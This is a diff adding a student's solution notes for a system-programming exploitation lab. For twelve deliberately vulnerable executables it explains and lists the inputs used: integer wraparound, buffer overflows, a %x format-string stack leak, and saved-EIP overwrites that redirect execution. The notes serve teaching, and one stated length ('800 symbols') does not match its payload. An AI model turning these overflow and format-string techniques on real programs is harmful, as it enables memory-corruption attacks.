@@ -1,0 +1,41 @@
+1 level
+	>127 symbols 'cause char is in [-128; 127]
+	level1.exe "qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq"
+2 level
+	get Unsigned in min = 0 : uintmax - 1 + 2
+	level2.exe 4294967294 1 2
+3 level
+	put negative number
+	level3.exe -1
+4 level
+	uintmax -1 + 2
+	level4.exe 4294967294
+5 level
+	overflow buf[] to get access to a
+	level5.exe 
+	11111111111111111
+6 level
+	CreateFile tries to open cmd
+	level6.exe System32
+7 level
+	\0: 0x00
+        we should put 16 symbols to change 8 last bits of 0xffffffff
+	level7.exe 1111111111111111
+8 level
+	print by formatting %x from stack while we find t = 0xaaaaaaaa (21 times)
+	level8 "%x %x %x %x %x %x %x %X %X %X %X %X %X %X %X %X %X %X %x %x %x"
+9 level
+	paswword and login stored consistently. We are to fill password with non 0-elements and add more than 4 elements to login to get 1 string which consists of paswword and login(> 4 elements 'cause we need to fill funtions memory cells in stack )
+	level9 12345 121122211212121212121221212122121
+10 level
+	to change i we should buff[16] = i. To have strlen(argv[0]) >= 16 we need to enter full path to level10.exe
+	"D:\2 курс\Системное программирование\DZ\System-programming\Venediktov Nikita group 13\Lab4\levels\level10"
+11 level
+	we need to overflow buff and get access to ebp and then to eip. to get saved_eip == 0x41424344 we need to change 4 bytes =>(D 0x44, C 0x43, B 0x42, A 0x41 in hex)
+	=> 80 symbols fo buff, 4 symbols for ebp, DCBA for eip 
+	level11  111111111111111111111111111111111111111111111111111111111111111111111111111111111111DCBA
+12 level
+	w need to overflow buff and EBP to get access to EIP and change it to call unreachable function. Address of unreachable: 0x40100f( 0x0f ^O, 0x10 ^P, 0x40 @)
+	800 symbols for buff + 4 symbols for EBP + 3 spec symbols for EIP + \0
+	level12 111111111111111111111111111111111111111111111111111111111111111111111111111111111111^O^P@
+	 	
